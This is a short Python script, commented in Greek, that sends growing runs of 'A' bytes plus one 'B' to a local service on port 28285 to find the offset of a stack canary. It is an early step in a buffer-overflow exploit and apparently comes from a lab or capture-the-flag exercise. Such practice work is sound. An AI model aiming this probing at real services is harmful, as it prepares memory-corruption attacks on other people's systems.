import socket

for pad in range(120, 140):
    # Στέλνουμε "B" αντί για "\x00". 
    # Μόλις το "B" ακουμπήσει το καναρίνι, θα δεις "Stack smashing".
    payload = b"A" * pad + b"B" 
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.5)
        s.connect(('127.0.0.1', 28285))
        s.sendall(payload)
        res = s.recv(1024)
        if b"Stack smashing" in res:
            print(f"[*] Found it! Canary starts exactly at offset: {pad}")
            break
        s.close()
    except:
        continue